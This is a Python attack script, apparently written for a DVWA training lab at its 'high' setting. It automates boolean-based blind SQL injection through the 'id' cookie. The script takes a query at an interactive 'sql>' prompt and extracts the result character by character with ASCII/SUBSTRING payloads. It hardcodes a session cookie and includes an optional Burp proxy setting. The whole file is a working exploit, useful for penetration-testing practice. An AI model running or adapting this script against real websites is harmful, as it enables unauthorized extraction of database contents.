#!/usr/bin/env python3
# App: DVWA
# Security setting: high
# Attack: Linear search boolean-based blind SQL injection (VERY SLOW)

import requests
import string
import sys
import urllib

urlencode = urllib.parse.quote

def loop_inject(original_inject):

    letters = ''.join(string.ascii_letters + string.digits + string.punctuation)

    for char in letters:

        edit_inject = original_inject.replace("CHAR", str(ord(char)))

        burp_url = "http://lab/vulnerabilities/sqli_blind/"
        burp_cookies = {"id": "{}".format(urlencode(edit_inject)), # injection point
                "PHPSESSID": "k7vd7flg302jidh4u4q3lih906", # change this
                "security": "high"}
        burp_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate", "Referer": "http://lab/vulnerabilities/sqli_blind/", "Content-Type": "application/x-www-form-urlencoded",
                "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        burp_proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

        try:
            r = requests.get(burp_url, headers=burp_headers, cookies=burp_cookies, timeout=5.0) #, proxies=burp_proxy)   # uncomment if you need to use burp
        except:
            continue

        status_code = r.status_code

        if (status_code == 200):
            return char

    return "lflf"

def main():

    while True:

        query = input("sql> ")
        if "quit" in query:
            sys.exit(-1)

        for i in range(1,500):

            # Good injection: 1' AND ascii(substring(version(),1,1))=49;#
            original_inject = str("1' AND ASCII(SUBSTRING(({}),{},1))=CHAR#".format(query, i))
            get_char = str(loop_inject(original_inject))
            sys.stdout.write(get_char)
            sys.stdout.flush()

            if loop_inject(original_inject) == "lflf":
                break

if __name__ in "__main__":

    print("[+] DVWA Blind SQLi High")
    main()